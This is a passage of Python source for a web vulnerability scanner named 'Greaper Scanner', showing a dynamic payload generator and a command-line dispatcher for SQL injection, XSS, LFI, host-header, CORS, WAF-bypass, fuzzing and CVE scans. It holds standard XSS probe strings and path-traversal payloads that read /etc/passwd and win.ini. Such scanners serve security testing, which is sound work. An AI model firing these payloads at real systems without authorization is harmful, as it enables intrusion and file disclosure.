            if "content-security-policy" not in response.headers:
                payloads.add("<script>alert(1)</script>")
                payloads.add("'><script>alert(1)</script>")
            
            # Add event handler payloads
            payloads.add('" onmouseover="alert(1)"')
            payloads.add("' onerror='alert(1)'")
            
            # Add encoded payloads
            payloads.add("javascript:alert(1)")
            payloads.add("&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;")
            
        elif scan_type == "lfi":
            # Generate LFI payloads based on detected OS
            if "windows" in response.text.lower():
                payloads.add("..\\..\\..\\windows\\win.ini")
                payloads.add("..\\..\\..\\boot.ini")
            else:
                payloads.add("../../../etc/passwd")
                payloads.add("../../../../../../etc/passwd")
            
            # Add null byte payloads if PHP version might be vulnerable
            if "php" in response.headers.get('server', '').lower():
                payloads.add("../../../etc/passwd%00")
                payloads.add("../../../etc/passwd\0")
        
        print(f"{COLOR_GREEN}[+] Generated {len(payloads)} dynamic payloads{COLOR_RESET}")
        return list(payloads)
        
    except Exception as e:
        print(f"{COLOR_RED}[-] Error generating dynamic payloads: {str(e)}{COLOR_RESET}")
        return []

def main():
    parser = argparse.ArgumentParser(description="Greaper Scanner")
    
    parser.add_argument("-u", "--url", help="Single target URL to scan, with 'FUZZ' as the payload insertion point")
    parser.add_argument("-l", "--list", help="File containing multiple URLs to scan, one URL per line")
    parser.add_argument("-s", "--sub-enum", action="store_true", help="Enable subdomain enumeration")
    parser.add_argument("-o", "--output", help="Output file to save results")
    parser.add_argument("--rate-limit", type=int, default=3, help="Rate limit for subdomain requests")
    parser.add_argument("-sqli", action="store_true", help="Enable SQL Injection detection")
    parser.add_argument("-xss", action="store_true", help="Enable Greaper XSS scanning")
    parser.add_argument("-lfi", action="store_true", help="Enable Greaper LFI scanning")
    parser.add_argument("-p", "--payload-file", help="File containing payloads (for XSS, LFI, SQLi, etc.)")
    parser.add_argument("-dynamic", action="store_true", help="Enable dynamic payload generation")
    parser.add_argument("-crawl", nargs='?', const=1, type=int, help="Crawl a site and extract links (optionally specify depth)")
    parser.add_argument("-hh", action="store_true", help="Scan for Host Header Injection")
    parser.add_argument("-cors", action="store_true", help="Scan for CORS misconfigurations")
    parser.add_argument("-ip", action="store_true", help="Perform advanced IP lookup and attempt WAF bypass")
    parser.add_argument("-cl", action="store_true", help="Check the content length of the target URLs")
    parser.add_argument("-lv", action="store_true", help="Check if the target subdomains are live and responding")
    parser.add_argument("-info", action="store_true", help="Scan JS files for sensitive information")
    parser.add_argument("-sec", action="store_true", help="Check security headers for the target URLs")
    parser.add_argument("-cve", action="store_true", help="Scan for CVEs based on server fingerprint")
    parser.add_argument("-sc", action="store_true", help="Check status codes of the URLs")
    parser.add_argument("-df", action="store_true", help="Enable directory fuzzing on common directories or specified wordlist via -p")
    parser.add_argument("-waf", action="store_true", help="Detect and analyze Web Application Firewalls")

    args = parser.parse_args()

    if args.df:
        if args.url:
            directory_fuzz(target=args.url, output_file=args.output, payload_file=args.payload_file)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: directory_fuzz(target=u, output_file=args.output, payload_file=args.payload_file), urls)
    
    if args.sub_enum:
        if args.url:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                loop.run_until_complete(enumerate_subdomains(url=args.url, output_file=args.output, rate_limit=args.rate_limit))
            finally:
                loop.close()
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                for url in urls:
                    loop.run_until_complete(enumerate_subdomains(url=url, output_file=args.output, rate_limit=args.rate_limit))
            finally:
                loop.close()

    elif args.sqli:
        if args.url:
            if args.dynamic:
                dynamic_payloads = generate_dynamic_payloads(args.url, "sqli")
                greaper_sqli_scanner(target=args.url, dynamic_payloads=dynamic_payloads, output_file=args.output)
            else:
                greaper_sqli_scanner(target=args.url, payload_file=args.payload_file, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                if args.dynamic:
                    executor.map(lambda u: greaper_sqli_scanner(target=u, dynamic_payloads=generate_dynamic_payloads(u, "sqli"), output_file=args.output), urls)
                else:
                    executor.map(lambda u: greaper_sqli_scanner(target=u, payload_file=args.payload_file, output_file=args.output), urls)

    elif args.xss:
        if args.url and args.payload_file:
            if args.dynamic:
                dynamic_payloads = generate_dynamic_payloads(args.url, "xss")
                greaper_xss_scanner(target=args.url, dynamic_payloads=dynamic_payloads, output_file=args.output)
            else:
                greaper_xss_scanner(target=args.url, payload_file=args.payload_file, output_file=args.output)
        elif args.list and args.payload_file:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                if args.dynamic:
                    executor.map(lambda u: greaper_xss_scanner(target=u, dynamic_payloads=generate_dynamic_payloads(u, "xss"), output_file=args.output), urls)
                else:
                    executor.map(lambda u: greaper_xss_scanner(target=u, payload_file=args.payload_file, output_file=args.output), urls)

    elif args.lfi:
        if args.url and args.payload_file:
            if args.dynamic:
                dynamic_payloads = generate_dynamic_payloads(args.url, "lfi")
                greaper_lfi_scanner(target=args.url, dynamic_payloads=dynamic_payloads, output_file=args.output)
            else:
                greaper_lfi_scanner(target=args.url, payload_file=args.payload_file, output_file=args.output)
        elif args.list and args.payload_file:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                if args.dynamic:
                    executor.map(lambda u: greaper_lfi_scanner(target=u, dynamic_payloads=generate_dynamic_payloads(u, "lfi"), output_file=args.output), urls)
                else:
                    executor.map(lambda u: greaper_lfi_scanner(target=u, payload_file=args.payload_file, output_file=args.output), urls)

    elif args.dynamic and args.url:
        dynamic_payload_generator(target=args.url, scan_type="sqli", output_file=args.output)

    elif args.crawl:
        start_time = datetime.now()  # Create start time once for all URLs
        if args.url:
            crawled_urls = enhanced_crawl(url=args.url, depth=args.crawl, output_file=args.output, start_time=start_time)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            for i, url in enumerate(urls):
                is_first = (i == 0)  # Only first URL gets is_first=True
                crawled_urls = enhanced_crawl(url=url, depth=args.crawl, output_file=args.output, 
                                           is_first=is_first, start_time=start_time)
        
        # Show elapsed time and save message once at the end
        elapsed_time = datetime.now() - start_time
        print(f"\n{COLOR_BLUE}[-] Time elapsed: {elapsed_time}{COLOR_RESET}")
        if args.output:
            print(f"{COLOR_GREEN}[+] Results saved to {args.output}{COLOR_RESET}")

    elif args.hh:
        if args.url:
            greaper_host_header_scan(target=args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: greaper_host_header_scan(target=u, output_file=args.output), urls)

    elif args.cors:
        if args.url:
            greaper_cors_scan(target=args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: greaper_cors_scan(target=u, output_file=args.output), urls)

    elif args.ip:
        if args.url:
            greaper_ip_lookup_bypass(target=args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: greaper_ip_lookup_bypass(target=u, output_file=args.output), urls)

    elif args.cl:
        if args.url:
            get_content_length(args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            process_urls_for_content_length(urls, output_file=args.output)

    elif args.lv:
        if args.url:
            check_live_urls.last_url = args.url  # Set the last URL
            check_live_urls(args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            check_live_urls.last_url = urls[-1]  # Set the last URL
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: check_live_urls(u, output_file=args.output), urls)

    elif args.info:
        if args.url:
            scan_js_files(args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: scan_js_files(u, output_file=args.output), urls)

    elif args.sec:
        if args.url:
            check_security_headers(args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: check_security_headers(u, output_file=args.output), urls)

    elif args.cve:
        if args.url:
            cve_scan_by_fingerprint(args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: cve_scan_by_fingerprint(u, output_file=args.output), urls)

    elif args.sc:
        if args.url:
            check_status_code(args.url, output_file=args.output)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: check_status_code(u, output_file=args.output), urls)

    elif args.df:
        if args.url:
            directory_fuzz(target=args.url, output_file=args.output, payload_file=args.payload_file)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(lambda u: directory_fuzz(target=u, output_file=args.output, payload_file=args.payload_file), urls)

    elif args.waf:
        if args.url:
            detect_waf(args.url)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(detect_waf, urls)

    else:
        print(f"{COLOR_ORANGE}[-] Missing required arguments. Please provide a target URL (-u) or a URL list (-l) and appropriate payload file (-p) for the selected scan mode.{COLOR_RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboard interrupt received. Exiting...")
    except Exception as e:
        print(f"{COLOR_ORANGE}An unexpected error occurred: {e}{COLOR_RESET}")
    finally:
        sys.exit(0)
